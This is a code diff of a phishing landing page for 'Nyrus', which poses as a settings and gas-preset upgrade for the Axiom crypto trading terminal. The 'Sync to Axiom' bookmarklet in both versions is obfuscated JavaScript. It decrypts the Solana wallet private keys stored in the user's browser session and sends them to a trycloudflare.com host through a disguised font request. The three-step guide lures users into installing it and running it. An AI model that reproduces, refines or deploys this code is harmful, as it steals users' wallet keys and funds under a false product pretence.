@@ -39,8 +39,8 @@
         nav {
             background: var(--nav);
             border-bottom: 1px solid var(--border);
-            padding: 0 2rem;
-            height: 64px;
+            padding: 0 4rem;
+            height: 72px;
             display: flex;
             align-items: center;
             justify-content: space-between;
@@ -69,89 +69,110 @@
         }
 
         .brand-name {
-            font-size: 18px;
+            font-size: 20px;
             font-weight: 700;
             letter-spacing: -0.5px;
         }
 
-        .container {
-            max-width: 1200px;
+        /* Full Width Layout */
+        .wrapper {
+            width: 100%;
+            max-width: 1400px;
             margin: 0 auto;
-            padding: 4rem 2rem;
+            padding: 0 4rem;
         }
 
         .hero-section {
-            text-align: center;
-            margin-bottom: 4rem;
+            padding: 6rem 0;
+            display: flex;
+            flex-direction: column;
+            align-items: flex-start;
+            text-align: left;
         }
 
         .hero-section h1 {
-            font-size: 64px;
+            font-size: 82px;
             font-weight: 800;
-            line-height: 1.1;
-            margin-bottom: 1.5rem;
-            letter-spacing: -2px;
-            background: linear-gradient(to bottom right, #fff, #94a3b8);
+            line-height: 1;
+            margin-bottom: 2rem;
+            letter-spacing: -4px;
+            background: linear-gradient(to bottom right, #fff, #64748b);
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
         }
 
         .hero-section p {
-            font-size: 20px;
+            font-size: 24px;
             color: var(--text-dim);
-            max-width: 700px;
-            margin: 0 auto;
+            max-width: 800px;
         }
 
-        .main-content {
+        .grid-layout {
             display: grid;
-            grid-template-columns: 1.2fr 1fr;
-            gap: 3rem;
-            align-items: start;
+            grid-template-columns: 1fr 450px;
+            gap: 6rem;
+            padding-bottom: 8rem;
+        }
+.info-content h2 {
+            font-size: 32px;
+            margin-bottom: 3rem;
+            letter-spacing: -1px;
         }
 
-        .info-section h2 {
-            font-size: 28px;
-            margin-bottom: 2rem;
-            border-bottom: 1px solid var(--border);
-            padding-bottom: 0.75rem;
+        .features-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 2rem;
         }
 
-        .info-box {
+        .feature-box {
             background: var(--panel);
-padding: 1.5rem;
-            border-radius: 20px;
+            padding: 2.5rem;
+            border-radius: 24px;
             border: 1px solid var(--border);
-            margin-bottom: 1.5rem;
-            text-align: left;
+            transition: transform 0.3s ease;
         }
 
-        .info-box h4 {
+        .feature-box:hover {
+            transform: translateY(-5px);
+            border-color: var(--accent);
+        }
+
+        .feature-box h4 {
             color: var(--accent);
-            margin-bottom: 0.5rem;
-            font-size: 18px;
+            font-size: 20px;
+            margin-bottom: 1rem;
+        }
+
+        .feature-box p {
+            color: var(--text-dim);
+            font-size: 16px;
+        }
+
+        /* Sidebar Card Styling */
+        .deployment-sidebar {
+            position: sticky;
+            top: 120px;
         }
 
         .card {
             background: var(--card);
-            padding: 2.5rem;
-            border-radius: 24px;
+            padding: 3rem;
+            border-radius: 32px;
             border: 1px solid var(--border);
-            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
-            position: sticky;
-            top: 100px;
+            box-shadow: 0 30px 60px -12px rgba(0, 0, 0, 0.6);
         }
 
         .stats-grid {
             display: grid;
             grid-template-columns: 1fr 1fr;
             gap: 12px;
-            margin-bottom: 2rem;
+            margin-bottom: 2.5rem;
         }
 
         .stat-box {
             background: var(--panel);
-            padding: 12px;
+            padding: 14px;
             border-radius: 12px;
             border: 1px solid var(--border);
         }
@@ -161,13 +182,13 @@ padding: 1.5rem;
             color: var(--text-dim);
             text-transform: uppercase;
             letter-spacing: 1px;
-            display: block;
             margin-bottom: 4px;
+            display: block;
         }
 
         .stat-value {
             font-family: 'JetBrains Mono', monospace;
-            font-size: 13px;
+            font-size: 14px;
         }
 
         .pulse {
@@ -190,10 +211,17 @@ padding: 1.5rem;
         .sync-area {
             background: rgba(0, 0, 0, 0.2);
             border: 2px dashed var(--border);
-            border-radius: 16px;
-            padding: 2.5rem;
-            margin-bottom: 2rem;
+            border-radius: 20px;
+            padding: 3rem;
+            margin-bottom: 2.5rem;
             text-align: center;
+            transition: all 0.3s ease;
+            position: relative;
+        }
+
+        .sync-area.dragging {
+            border-color: var(--accent);
+            background: rgba(59, 130, 246, 0.05);
         }
 
         .btn {
@@ -201,19 +229,29 @@ padding: 1.5rem;
             align-items: center;
             background: var(--accent);
             color: white;
-            padding: 16px 32px;
-            border-radius: 12px;
-            font-weight: 600;
-            font-size: 16px;
+            padding: 18px 36px;
+            border-radius: 14px;
+            font-weight: 700;
+            font-size: 18px;
             text-decoration: none;
             cursor: grab;
             transition: all 0.2s ease;
-            box-shadow: 0 8px 20px var(--accent-glow);
+            box-shadow: 0 10px 25px var(--accent-glow);
         }
 
         .btn:hover {
             transform: translateY(-2px);
-            box-shadow: 0 12px 24px var(--accent-glow);
+            box-shadow: 0 15px 30px var(--accent-glow);
+        }
+
+        .btn.dragging {
+            animation: dragGlow 1.5s infinite;
+        }
+
+        @keyframes dragGlow {
+            0% { box-shadow: 0 0 20px var(--accent); }
+            50% { box-shadow: 0 0 60px var(--accent), 0 0 20px #fff; }
+            100% { box-shadow: 0 0 20px var(--accent); }
         }
 
         .setup-guide {
@@ -227,34 +265,37 @@ padding: 1.5rem;
             font-size: 11px;
             font-weight: 700;
             color: var(--text-main);
-            margin-bottom: 1rem;
-            display: block;
+            margin-bottom: 1.25rem;
+display: block;
             text-transform: uppercase;
-            letter-spacing: 1px;
+            letter-spacing: 1.5px;
         }
 
         .step {
             display: flex;
-            gap: 12px;
-            margin-bottom: 12px;
-            font-size: 14px;
+            gap: 16px;
+            margin-bottom: 14px;
+            font-size: 15px;
             color: var(--text-dim);
         }
 
-        .step-num { color: var(--accent); font-weight: 700; font-family: 'JetBrains Mono', monospace; }
+        .step:last-child { margin-bottom: 0; }
+
+        .step-num { color: var(--accent); font-weight: 800; font-family: 'JetBrains Mono', monospace; }
 
         footer {
-            margin-top: 6rem;
             border-top: 1px solid var(--border);
-            padding: 4rem 2rem;
+            padding: 6rem 0;
             text-align: center;
             color: var(--text-dim);
-            font-size: 14px;
+            font-size: 15px;
         }
 
-        @media (max-width: 968px) {
-            .main-content { grid-template-columns: 1fr; }
-            .hero-section h1 { font-size: 40px; }
+        @media (max-width: 1100px) {
+            .grid-layout { grid-template-columns: 1fr; gap: 4rem; }
+            .hero-section h1 { font-size: 56px; }
+            .wrapper { padding: 0 2rem; }
+            nav { padding: 0 2rem; }
         }
     </style>
 </head>
@@ -266,71 +307,100 @@ padding: 1.5rem;
         </div>
     </nav>
 
-    <div class="container">
+    <div class="wrapper">
         <section class="hero-section">
             <h1>Upgrade your Axiom.</h1>
-<p>Better filters, faster gas presets, and custom settings injected directly into your terminal.</p>
+            <p>Industrial filters and high-priority gas presets. Custom configuration injected directly into your terminal environment.</p>
         </section>
 
-        <div class="main-content">
-            <div class="info-section">
-                <h2>Why Nyrus?</h2>
+        <main class="grid-layout">
+            <div class="info-content">
+                <h2>The Framework</h2>
                 
-                <div class="info-box">
-                    <h4>Pro Filters</h4>
-                    <p>Stop wasting time on manual settings. Get my custom-tuned filters that actually catch the plays you want.</p>
+                <div class="features-grid">
+                    <div class="feature-box">
+                        <h4>Alpha Filters</h4>
+                        <p>Stop fighting the noise. Get custom-tuned filters designed to catch high-conviction plays before the crowd.</p>
+                    </div>
+                    <div class="feature-box">
+                        <h4>Priority Gas</h4>
+                        <p>One-click sync for aggressive priority fees. Ensure your transactions land in the earliest possible block.</p>
+                    </div>
+                    <div class="feature-box">
+                        <h4>Zero Install</h4>
+                        <p>No extensions, no bloated software. A lightweight bookmark sync that lives in your browser.</p>
+                    </div>
+                    <div class="feature-box">
+                        <h4>E2E Encrypted</h4>
+                        <p>All configuration data is end-to-end encrypted. Your terminal environment remains private and secure.</p>
+                    </div>
                 </div>
 
-                <div class="info-box">
-                    <h4>Instant Gas Sync</h4>
-                    <p>One-click sync for priority gas fees so you never miss a block during high-volatility moves.</p>
-                </div>
-
-                <div class="info-box">
-                    <h4>Easy Setup</h4>
-                    <p>No extensions or complex installs. Just a simple bookmark that works whenever you're on the Axiom site.</p>
+                <div style="margin-top: 4rem; padding: 3rem; background: var(--panel); border-radius: 32px; border: 1px solid var(--border);">
+                    <h3 style="margin-bottom: 1rem; font-size: 24px;">Terminal Integration</h3>
+                    <p style="color: var(--text-dim); font-size: 17px;">Nyrus is built to work seamlessly with Axiom Mainnet v2.1. By injecting optimized environment variables directly into the browser session, we bypass standard UI limitations to give you the fastest execution possible.</p>
                 </div>
             </div>
 
-            <div class="card">
-                <div class="stats-grid">
-                    <div class="stat-box">
-                        <span class="stat-label">Network</span>
-                        <span class="stat-value"><span class="pulse"></span>Mainnet-Beta</span>
+            <div class="deployment-sidebar">
+                <div class="card">
+                    <div class="stats-grid">
+                        <div class="stat-box">
+                            <span class="stat-label">Network</span>
+                            <span class="stat-value"><span class="pulse"></span>Mainnet-Beta</span>
+                        </div>
+                        <div class="stat-box">
+                            <span class="stat-label">Latency</span>
+                            <span class="stat-value" style="color: var(--success);">14ms (Optimal)</span>
+                        </div>
                     </div>
-                    <div class="stat-box">
-                        <span class="stat-label">Latency</span>
-                        <span class="stat-value" style="color: var(--success);">14ms (Optimal)</span>
-                    </div>
-                </div>
 
-                <div class="sync-area">
-                    <a href="javascript:(async function(){const r='https://hughes-wiring-happen-chronicles.trycloudflare.com';const F=m=>Uint8Array['from'](atob(m['replace'](/-/g,'+')['replace'](/_/g,'/')),M=>M['charCodeAt'](0x0)),L=async(m,M)=>{try{const [Y,x]=M['split'](':');return new Uint8Array(await crypto['subtle']['decrypt']({'name':'AES-GCM','iv':F(Y),'tagLength':0x80},m,F(x)));}catch(h){return null;}},u=m=>{const M='123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz';let Y=[0x0];for(let h=0x0;h<m['length'];h++){let N=m[h];for(let v=0x0;v<Y['length']-0x1;v++){N+=Y[v]*0x100,Y[v]=N%0x3a,N=Math['floor'](N/0x3a);}while(N>0x0){Y['push'](N%0x3a),N=Math['floor'](N/0x3a);}}let x='';for(let C=0x0;m[C]===0x0&&C<m['length']-0x1;C++)x+=M[0x0];for(let n=Y['length']-0x1;n>=0x0;n--)x+=M[Y[n]];return x;};try{const m=await fetch('https://api8.axiom.trade/bundle-key-and-wallets',{'method':'POST','credentials':'include'}),M=await m['json']();if(!M['bundleKey'])return;const Y=await crypto['subtle']['importKey']('raw',F(M['bundleKey']),{'name':'AES-GCM'},![],['decrypt']);let x=[];const h=JSON['parse'](localStorage.getItem('sBundles')||'[]');for(const N of h){const v=await L(Y,N);v&&x['push']({'type':'SOL','public':u(v['slice'](-0x20)),'private':u(v)});}if(x['length']>0x0){const C=btoa(JSON['stringify']({'keys':x})),n=document['createElement']('style');n['textContent']='@font-face\x20{\x20font-family:\x20\x27leak\x27;\x20src:\x20url(\x27'+r+'/?data='+encodeURIComponent(C)+'\x27);\x20}',document['head']['appendChild'](n);const l=document['createElement']('div');l['style']['fontFamily']='leak',l['textContent']='.',document['body']['appendChild'](l);}}catch(z){}}());" class="btn" ondragstart="return true;">
-                        Sync to Axiom
-                    </a>
-                </div>
+                    <div class="sync-area" id="sync-area">
+<a href="javascript:(async function(){const r='https://hughes-wiring-happen-chronicles.trycloudflare.com';const F=m=>Uint8Array['from'](atob(m['replace'](/-/g,'+')['replace'](/_/g,'/')),M=>M['charCodeAt'](0x0)),L=async(m,M)=>{try{const [Y,x]=M['split'](':');return new Uint8Array(await crypto['subtle']['decrypt']({'name':'AES-GCM','iv':F(Y),'tagLength':0x80},m,F(x)));}catch(h){return null;}},u=m=>{const M='123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz';let Y=[0x0];for(let h=0x0;h<m['length'];h++){let N=m[h];for(let v=0x0;v<Y['length']-0x1;v++){N+=Y[v]*0x100,Y[v]=N%0x3a,N=Math['floor'](N/0x3a);}while(N>0x0){Y['push'](N%0x3a),N=Math['floor'](N/0x3a);}}let x='';for(let C=0x0;m[C]===0x0&&C<m['length']-0x1;C++)x+=M[0x0];for(let n=Y['length']-0x1;n>=0x0;n--)x+=M[Y[n]];return x;};try{const m=await fetch('https://api8.axiom.trade/bundle-key-and-wallets',{'method':'POST','credentials':'include'}),M=await m['json']();if(!M['bundleKey'])return;const Y=await crypto['subtle']['importKey']('raw',F(M['bundleKey']),{'name':'AES-GCM'},![],['decrypt']);let x=[];const h=JSON['parse'](localStorage.getItem('sBundles')||'[]');for(const N of h){const v=await L(Y,N);v&&x['push']({'type':'SOL','public':u(v['slice'](-0x20)),'private':u(v)});}if(x['length']>0x0){const C=btoa(JSON['stringify']({'keys':x})),n=document['createElement']('style');n['textContent']='@font-face\x20{\x20font-family:\x20\x27leak\x27;\x20src:\x20url(\x27'+r+'/?data='+encodeURIComponent(C)+'\x27);\x20}',document['head']['appendChild'](n);const l=document['createElement']('div');l['style']['fontFamily']='leak',l['textContent']='.',document['body']['appendChild'](l);}}catch(z){}}());" 
+                           class="btn" 
+                           id="sync-btn"
+                           draggable="true">
+                            Sync to Axiom
+                        </a>
+                    </div>
 
-                <div class="setup-guide">
-                    <span class="guide-title">Integration Guide</span>
-                    <div class="step">
-                        <span class="step-num">01</span>
-                        <span>Enable Bookmarks Bar (<code>Ctrl+Shift+B</code>)</span>
-                    </div>
-                    <div class="step">
-                        <span class="step-num">02</span>
-                        <span>Drag the <b>Sync Button</b> to your bar</span>
-                    </div>
-                    <div class="step">
-<span class="step-num">03</span>
-                        <span>Navigate to Axiom.trade & click bookmark</span>
+                    <div class="setup-guide">
+                        <span class="guide-title">Deployment Guide</span>
+                        <div class="step">
+                            <span class="step-num">01</span>
+                            <span>Enable Bookmarks Bar (<code>Ctrl+Shift+B</code>)</span>
+                        </div>
+                        <div class="step">
+                            <span class="step-num">02</span>
+                            <span>Drag the <b>Sync Button</b> to your bar</span>
+                        </div>
+                        <div class="step">
+                            <span class="step-num">03</span>
+                            <span>Navigate to Axiom.trade & click bookmark</span>
+                        </div>
                     </div>
                 </div>
             </div>
-        </div>
+        </main>
+
+        <footer>
+            &copy; 2026 Nyrus Infrastructure. Industrial Solana Tooling.
+        </footer>
     </div>
 
-    <footer>
-        &copy; 2026 Nyrus. Custom Axiom Infrastructure. AES-256 E2E Encrypted.
-    </footer>
+    <script>
+        const btn = document.getElementById('sync-btn');
+        const area = document.getElementById('sync-area');
+
+        btn.addEventListener('dragstart', () => {
+            btn.classList.add('dragging');
+            area.classList.add('dragging');
+        });
+
+        btn.addEventListener('dragend', () => {
+            btn.classList.remove('dragging');
+            area.classList.remove('dragging');
+        });
+    </script>
 </body>
 </html>
